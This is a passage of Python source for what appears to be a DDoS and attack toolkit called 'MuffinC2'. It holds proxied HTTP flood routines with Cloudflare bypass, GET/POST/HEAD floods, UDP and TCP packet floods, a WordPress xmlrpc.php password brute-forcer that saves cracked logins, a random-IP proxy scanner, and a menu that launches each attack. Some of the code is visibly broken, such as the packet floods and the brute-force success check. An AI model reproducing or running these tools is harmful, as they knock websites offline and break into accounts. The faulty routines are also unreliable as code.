                proxies = ip.readlines()
                ip.close()
                def requestor(url, proxy, scraper):
                    response = requests.get(url, proxies=proxy)
                    response = scraper.get(url, proxies=proxy)
                    response = requests.get(url, proxies=proxy)
                    savelog(url)
                    response = scraper.get(url, proxies=proxy)
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=attack_pxsky, args=(url, scraper, threadsi, proxies, requestor))
                    ts.start()
            def attack_pxsky(url, scraper, threadsi, proxies, requestor):
                proxy = {
                    "http": 'http://'+random.choice(proxies),
                    "https": 'https://'+random.choice(proxies)
                }
                if int(t) > 0:
                    try:
                        requestor(url, proxy, scraper)
                    except:
                        pass
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                start_pxsky(url, threadsi, t)
                timer.join()
        def PXSTAR():
            ua = UserAgent()
            ip = open('ip_list.txt','r')
            proxies = ip.readlines()
            ip.close()
            header = {
                "User-Agent": ua.chrome,
                "Accept": "text/plain,text/html,*/*",
                "Accept-Encoding": "gzip,deflate,br",
                "Connection": "keep-alive"
            }
            proxy = {
                "http": 'http://'+str(random.choice(proxies)),
                "https": 'https://'+str(random.choice(proxies))
            }
            def star(url, header, proxy):
                scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
                try:
                    response = scraper.get(url, headers=header, proxies=proxy)
                    response = requests.get(url, headers=header, proxies=proxy)
                    savelog(url)
                    for _ in range(200):
                        response = scraper.get(url, headers=header, proxies=proxy)
                except Exception as e:
                    print("An error occurred, Please contact @MrSanZzXe at telegram, Error Code : ", e)
                    exit()
            def attack(url, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=star, args=(url, header, proxy))
                    ts.start()
            if __name__ == '__main__':
                url, threadsi, t = layer7_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                attack(url, threadsi, t)
                timer.join()
        class requests():
            def head():
                def start_head(url, threadsi, t):
                    for _ in range(int(threadsi)):
                        threads = threading.Thread(target=attack_head, args=(url, t))
                        threads.start()
                def attack_head(url, t):
                    ua = UserAgent()
                    head = {
                        "User-Agent": ua.chrome
                    }
                    try:
                        requests.head(url, headers=head)
                        requests.head(url, headers=head)
                    except:
                        pass
                if __name__ == '__main__':
                    url, threadsi, t = layer7_target()
                    timer = threading.Thread(target=countdown, args=(t,))
                    timer.start()
                    start_head(url, threadsi, t)
                    timer.join()
            def post():
                def start_head(url, threadsi, t):
                    for _ in range(int(threadsi)):
                        threads = threading.Thread(target=attack_head, args=(url, t))
                        threads.start()
                def attack_head(url, t):
                    ua = UserAgent()
                    head = {
                        "User-Agent": ua.chrome
                    }
                    try:
                        requests.post(url, headers=head)
                        requests.post(url, headers=head)
                    except:
                        pass
                if __name__ == '__main__':
                    url, threadsi, t = layer7_target()
                    timer = threading.Thread(target=countdown, args=(t,))
                    timer.start()
                    start_head(url, threadsi, t)
                    timer.join()
            def get():
                def start_head(url, threadsi, t):
                    for _ in range(int(threadsi)):
                        threads = threading.Thread(target=attack_head, args=(url, t))
                        threads.start()
                def attack_head(url, t):
                    ua = UserAgent()
                    head = {
                        "User-Agent": ua.chrome
                    }
                    try:
                        requests.get(url, headers=head)
                        requests.get(url, headers=head)
                    except:
                        pass
                if __name__ == '__main__':
                    url, threadsi, t = layer7_target()
                    timer = threading.Thread(target=countdown, args=(t,))
                    timer.start()
                    start_head(url, threadsi, t)
                    timer.join()
        ################LAYER 4################
        ###UDP TCP TLS SYN ACK ICMP ESP SSH ###
        
        def UDP():
            def SUDP(ip, port, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=AUDP, args=(ip, port, t))
                    ts.start()
            def AUDP(ip, port, t):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                src_ip = "192.168.1.1"
                dst_ip = f"{ip}"
                src_port = 8080
                dst_port = int(port)
                data_length = 50
                checksum = 5

                udp_header = struct.pack('!HHHH', src_port, dst_port, 8 + data_length, checksum)
                if int(t) > 0:
                    try:
                        s.connect((ip,port))
                        s.sendto(str(udp_header).encode(), (ip,port))
                        s.close()
                    except:
                        pass
            if __name__ == '__main__':
                ip, port, threadsi, t = layer4_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                SUDP(ip, port, threadsi, t)
                timer.join()
        def TCP():
            def STCP(ip, port, threadsi, t):
                for _ in range(int(threadsi)):
                    ts = threading.Thread(target=ATCP, args=(ip, port, t))
                    ts.start()
            def ATCP(ip, port, t):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                def generate_tcp_header(source_ip, dest_ip, source_port, dest_port, seq_num, ack_num):
                    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, seq_num, ack_num, 5, 0, 8192, 0, 0)
                    return tcp_header
                source_ip = "192.168.1.1"
                dest_ip = f"{ip}"
                source_port = 8080
                dest_port = port
                seq_num = 1000
                ack_num = 0
                generated_tcp_header = generate_tcp_header(source_ip, dest_ip, source_port, dest_port, seq_num, ack_num)
                for _ in range(int(threadsi)):
                    try:
                        s.connect((ip,port))
                        s.sendto(str(generated_tcp_header).encode(), (ip,port))
                        s.close()
                    except:
                        pass
            if __name__ == '__main__':
                ip, port, threadsi, t = layer4_target()
                timer = threading.Thread(target=countdown, args=(t,))
                timer.start()
                STCP(ip, port, threadsi, t)
                timer.join()
    except Exception as e:
        print(e)
        pass
class TOOLS():
    def proxy():
        ip_list = open('ip_list.txt', 'r')
        ips = ip_list.readlines()
        ip_list.close()
        proxy = random.choice(ips)
        print(proxy)
    def webcrawler():
        def web_crawler(url):
            ua = UserAgent()
            ip = open('ip_list.txt', 'r')
            proxies = ip.readlines()
            ip.close()
            proxy = {
                "http": 'http://'+str(random.choice(proxies)),
                "https": 'https://'+str(random.choice(proxies))
            }
            heads = {
                f"User-Agent": f"{ua.chrome}"
            }
            try:
                # Send a GET request to the URL
                response = requests.get(url, headers=heads)

                # Check if the request was successful (status code 200)
                if response.status_code == 200:
                    # Parse the HTML content of the webpage
                    soup = BeautifulSoup(response.content, 'html.parser')

                    # Get the base URL of the site
                    base_url = response.url
                    print(f"{purple}[{white}~{purple}] {white}Site: {white}", base_url)

                    # Extract all the links on the webpage
                    links = soup.find_all('a', href=True)
                    for link in links:
                        absolute_url = urljoin(base_url, link['href'])
                        if '?' in absolute_url:
                            print(f"{purple}[{white}~{purple}]{red} URI: {white}", absolute_url)

                        elif absolute_url.endswith('/'):
                            print(f"{purple}[{white}~{purple}] {yellow}Crawled link/folder: {white}", absolute_url)
                        ext = ['doc', 'docx', 'pdf', 'db', 'sql', 'xls', 'xlsx', 'docm', 'dotm', 'ppt', 'php', 'png', 'jpeg', 'jpg', 'webp', 'txt', 'html', 'css']
                        for i in ext:
                            if absolute_url.endswith(i):
                                print(f"{purple}[{white}~{purple}]{green} Crawled file: {white}", absolute_url)
                elif response.status_code == 400:
                    pass
                else:
                    print(red + f"Failed to retrieve webpage. Status code:", response.status_code)

            except Exception as e:
                print(red + f"An error occurred:", str(e))
        # Example usage
        if __name__ == '__main__':
            site = input(f"{purple}[{white}~{purple}] {white} Your Target URL : {white}")
            web_crawler(site)
    def ping():
        def ping_website(website):
            try:
                if os.name == 'nt':
                    response = os.system("ping -t " + website)
                elif os.name == 'posix':
                    response = os.system("ping " + website)

                if response == 0:
                    print(f"{website} is up!")
                else:
                    print(f"{website} is down.")
            except KeyboardInterrupt:
                return
        url = input("Target Url : ")
        if 'https://' in url:
            website = url.replace('https://', '\r')
        elif 'http://' in url:
            website = url.replace('http://', '\r')
        else:
            pass
        ping_website(website)
    def proxyhunt():
        def start_hunt():
            def random_ip():
                ips = random.randint(1,3)
                ip1 = ''.join(random.choices("0123456789", k=ips))
                ip2 = ''.join(random.choices("0123456789", k=ips))
                ip3 = ''.join(random.choices("0123456789", k=ips))
                ip4 = ''.join(random.choices("0123456789", k=ips))
                ip = "{}.{}.{}.{}:{}".format(ip1,ip2,ip3,ip4,port)
                return ip
            while True:
                time.sleep(0.1)
                count = int(0)
                jum = random.randint(1, 5)
                port = ''.join(random.choices("0123456789", k=jum))
                ip_list = random_ip()
                print(ip_list)
                try:
                    prox = 'http://'+ip_list
                    r = requests.get(prox)
                    if r.status_code == 200:
                        print("Proxy Detected !")
                        count += 1
                        def write_proxy():
                            ip = open('proxy_list.txt', 'r')
                            ip.write(str(ip_list+'\n'))
                            ip.close()
                            print("{} Proxy Hunted. : {}".format(count, ip_list))
                        write_proxy()
                        pass
                    else:
                        print("Not a proxy : {}".format(ip_list))
                        pass
                except KeyboardInterrupt:
                    exit()
                except:
                    pass
        if __name__ == '__main__':
            print("Start Hunting..")
            while True:
                tr = threading.Thread(target=start_hunt)
                tr.start()
    def site_info():
        if __name__ == '__main__':
            url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
            savelog(url)
            print("LOGS are saved in folder 'LOGS' ")
    class __function__():
        def wp_bruteforce():
            xml_path = '/xmlrpc.php'
            def start_brute(url_file, file_name):
                with open(url_file, 'r') as f:
                    urls = f.readline()
                site = urls
                list = site.split()
                for url in list:
                    def url_test(url):
                        if 'https://' in url:
                            pass
                        elif 'http://' in url:
                            pass
                        else:
                            try:
                                url = 'https://'+url
                            except Exception:
                                url = 'http://'+url
                        if '/wp-login.php' in url:
                            url = url.replace('/wp-login.php', xml_path)
                        elif xml_path in url:
                            pass
                        else:
                            url = url + xml_path
                        print(f'{color.green()}Url Are Parsed: {color.white()}', url)
                        return url
                    url = url_test(url)
                    def bypass():
                        with open(file_name, 'rb') as files:
                            files_content = files.readlines()
                        nick_lines = files_content
                        password_lines = files_content
                        while True:
                            for nick in nick_lines:
                                for password in password_lines:
                                    try:
                                            # Membuat payload untuk data login
                                        xml_payload = """
                                        <methodCall>
                                            <methodName>wp.getUsersBlogs</methodName>
                                            <params>
                                                <param><value>{}</value></param>
                                                <param><value>{}</value></param>
                                            </params>
                                        </methodCall>
                                        """.format(nick, password)

                                        # Melakukan permintaan POST untuk login
                                        process = f"---------------------------\nTrying Nick: {nick}\nPassword: {password}\nUrl: {url}\n---------------------------\n\n"
                                        print(process, end='\r')
                                        response = requests.post(url, data=xml_payload, timeout=10)
                                        keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' or 'blogName'
                                        if re.search(keyword, response.text, re.IGNORECASE):
                                                payload = '{}#{}@{}'.format(url, nick, password)
                                                print(success + f'Login Success !')
                                                print(response)
                                                def log(url):
                                                    file = open((url) + ".txt", "a")
                                                    file.write(str(payload))
                                                    file.write("\n")
                                                    file.close
                                                log(url)
                                        else:
                                            print(fail + f'Login Failed.')
                                            print(response)
                                    except requests.exceptions.ReadTimeout:
                                        print("Request Timed Out, Please Wait..")
                                        time.sleep(60)
                                        continue
                                print(success + f"[ + ] Done.. [ + ]")
                    bypass()
            if __name__ == '__main__':
                url_file = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL FILE LIST             "+'\033[1;35m'+': '+'\033[0m')
                file_name = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"USN & PASS FILE LIST     "+'\033[1;35m'+': '+'\033[0m')
                start_brute(url_file, file_name)
class main():
    def main():
        logo.main()
        PS1 = ""+'\033[1;35m'+"╭────["+'\033[0m'+"MuffinC2"+'\033[0;31;40m'+"@"+'\033[0m'+"localhost"+'\033[1;35m'+"]\n"+'\033[1;35m'+"╰───>"+'\033[0m'+" "
        while main():
            try:
                prompt = input(PS1+"")
                if prompt.lower() == 'help':
                    logo.help()
                elif prompt.lower() == 'main':
                    logo.main()
                elif prompt.lower() == 'proxy':
                    TOOLS.proxy()
                elif prompt.lower() == 'layer7':
                    logo.layer7()
                elif prompt.lower() == 'layer4':
                    logo.layer4()
                elif prompt.lower() == 'tools':
                    logo.tools()
                elif prompt.lower() == 'pxcfb':
                    DDOS.PXCFB()
                elif prompt.lower() == 'cfb':
                    DDOS.CFB()
                elif prompt.lower() == 'sky':
                    DDOS.SKY()
                elif prompt.lower() == 'pps':
                    DDOS.PPS()
                elif prompt.lower() == 'ion':
                    DDOS.ION()
                elif prompt.lower() == 'bypass1':
                    DDOS.BYPASS1()
                elif prompt.lower() == 'cfpro':
                    DDOS.CFPRO()
                elif prompt.lower() == 'pxcfpro':
                    DDOS.PXCFPRO()
                elif prompt.lower() == 'cfsoc':
                    DDOS.CFSOC()
                elif prompt.lower() == 'bypass2':
                    DDOS.BYPASS2()
                elif prompt.lower() == 'stresserv1':
                    DDOS.STRESSERV1()
                elif prompt.lower() == 'stresserv2':
                    DDOS.STRESSERV2()
                elif prompt.lower() == 'udp':
                    DDOS.UDP()
                elif prompt.lower() == 'tcp':
                    DDOS.TCP()
                elif prompt.lower() == 'pwn':
                    DDOS.PWNED()
                elif prompt.lower() == 'pxsky':
                    DDOS.PXSKY()
                elif prompt.lower() == 'pxstar':
                    DDOS.PXSTAR()
                elif prompt.lower() == 'get':
                    DDOS.requests.get()
                elif prompt.lower() == 'post':
                    DDOS.requests.post()
                elif prompt.lower() == 'head':
                    DDOS.requests.head()
                elif prompt.lower() == 'crawl':
                    TOOLS.webcrawler()
                elif prompt.lower() == 'ping':
                    TOOLS.ping()
                elif prompt.lower() == 'proxyhunt':
                    TOOLS.proxyhunt()
                elif prompt.lower() == 'siteinfo':
                    TOOLS.site_info()
                elif prompt.lower() == 'exit':
                    print("Cya! ;).")
                    exit()
            except KeyboardInterrupt:
                exit()
            except:
                exit()
        else:
            pass
if __name__ == '__main__':
    main.main()
